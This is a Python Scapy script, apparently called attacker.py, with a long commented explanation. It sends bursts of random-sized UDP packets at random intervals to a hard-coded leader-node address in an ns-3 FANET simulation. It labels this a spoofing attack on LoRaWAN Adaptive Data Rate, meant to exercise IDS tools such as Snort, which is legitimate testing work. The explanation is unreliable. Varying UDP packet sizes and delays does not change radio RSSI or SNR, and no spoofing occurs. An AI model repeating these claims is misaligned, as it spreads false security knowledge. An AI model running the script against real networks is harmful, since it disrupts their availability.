from scapy.all import *
import random
import time

# Define the IP address and port of the leader node
leader_ip = "192.168.1.1"  # Update with the actual IP of the leader node in the FANET
udp_port = 9  # Typically the echo server port in the simulation

# Function to simulate signal degradation (lower RSSI/SNR)
def simulate_signal_degradation():
    # Introduce random delays and variable packet sizes to mimic a poor connection
    packet_size = random.choice([50, 150, 300, 512, 1024])  # Specific packet sizes to vary load
    payload = random._urandom(packet_size)
    delay = random.uniform(0.5, 2.0)  # Larger delay to simulate poor signal conditions
    return payload, delay

# Craft and send packets with random and simulated attributes to manipulate ADR
def spoof_fanet_traffic(target_ip, port, duration=60):
    end_time = time.time() + duration
    while time.time() < end_time:
        # Alternate between normal and degraded signals
        if random.choice([True, False]):  # Randomly choose to simulate signal degradation
            payload, delay = simulate_signal_degradation()
            print("Simulating degraded signal environment")
        else:
            packet_size = random.randint(50, 1024)  # Normal random packet size
            payload = random._urandom(packet_size)
            delay = random.uniform(0.1, 0.3)  # Normal delay
        
        # Craft UDP packet with randomized attributes
        pkt = IP(dst=target_ip) / UDP(dport=port) / payload
        send(pkt, verbose=0)  # Send packet
        time.sleep(delay)  # Wait before sending the next packet
        print(f"Sent packet of size {len(payload)} bytes to {target_ip} with delay {delay:.2f}s")

# Start sending spoofed packets to the leader node
if __name__ == "__main__":
    print("Starting attack targeting ADR in FANET...")
    spoof_fanet_traffic(leader_ip, udp_port, duration=60)  # Run for 60 seconds
    print("Attack completed.")


#The `attacker.py` script is designed to target a FANET (Flying Ad Hoc Network) running in ns-3, specifically exploiting the Adaptive Data Rate (ADR) mechanism in LoRaWAN used by the network's leader node. This script works by simulating adversarial conditions that mimic poor signal quality to influence the ADR and cause disruption in network performance. Here’s a breakdown of how the attack is implemented and operates in conjunction with the ns-3 simulation:

#1. Target Specification: The script first identifies the IP address and UDP port of the leader node in the FANET (`leader_ip` and `udp_port`). The leader node is central to the FANET's communication and control, making it a key target for influencing the network.

#2. Signal Degradation Simulation: A critical part of this adversarial strategy is to simulate poor signal conditions. The function `simulate_signal_degradation` introduces random delays and variable packet sizes, intending to replicate conditions of reduced RSSI (Received Signal Strength Indicator) or SNR (Signal-to-Noise Ratio). This function alternates packet size and introduces delays, making the network appear to be in a less favorable transmission environment.

#3. Crafting and Sending Spoofed Traffic: 
  # - The `spoof_fanet_traffic` function is central to executing the attack. It generates UDP packets with randomly chosen sizes and varying delays between packet transmissions. The randomness in packet sizes and inter-packet delays further simulates network noise and overload.
  # - For each packet, there’s a chance the script will use the simulated degraded signal parameters, further increasing variability and reducing predictability.
 #  - These packets are constructed using the Scapy library, with the target IP and port embedded in each packet, and are sent directly to the leader node’s IP address. The variability in the packet properties is intended to exploit any ADR adjustments the leader might make based on perceived network conditions.

#4. Running Simultaneously with ns-3: This script runs concurrently with the FANET simulation in ns-3. By targeting the leader node with continuous, randomized UDP packets, the script can interfere with the FANET’s communication and potentially disrupt network operations. As the leader node adjusts its transmission power or data rate in response to apparent signal degradation (mimicked by the attack), it can create performance issues or even reduce network availability.

#5. Impact on ADR and Detection: 
  # - The design of this attack can force the leader node to adjust its ADR based on misleading network conditions, making it vulnerable to performance degradation. In LoRaWAN, ADR mechanisms typically adjust data rates and transmission power, which can be misled by the degraded signal simulation.
  # - Additionally, this script operates as a form of adversarial attack testing. By running in parallel with an ns-3 FANET simulation with IDS mechanisms, such as Snort or a potential ML-based IDS, this setup allows us to observe and refine detection capabilities.
